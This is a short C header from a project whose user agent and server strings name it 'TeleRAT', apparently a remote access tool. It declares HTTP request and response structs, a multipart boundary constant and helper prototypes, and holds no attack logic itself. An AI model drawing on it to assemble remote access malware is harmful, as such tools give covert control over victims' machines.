#ifndef HTTP_HELPER_
#define HTTP_HELPER_

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USER_AGENT "TeleRAT/0.1.0"
#define SERVER "TeleRAT"
#define BOUNDARY "teleratboundary123456789"

struct http_request{
    char method[10];
    char path[256];
    char version[10];
    char host[256];
    char content_type[20];
    unsigned int content_length;
};

struct http_response{
    char version[10];
    int status_code;
    char status[100];
    char content_type[20];
    char charset[10];
    unsigned int content_length;
};

void request_header(struct http_request *request, char **buffer);
void response_header(struct http_response *response, char **buffer);
void create_boundary(char *data, char *buffer);

#endif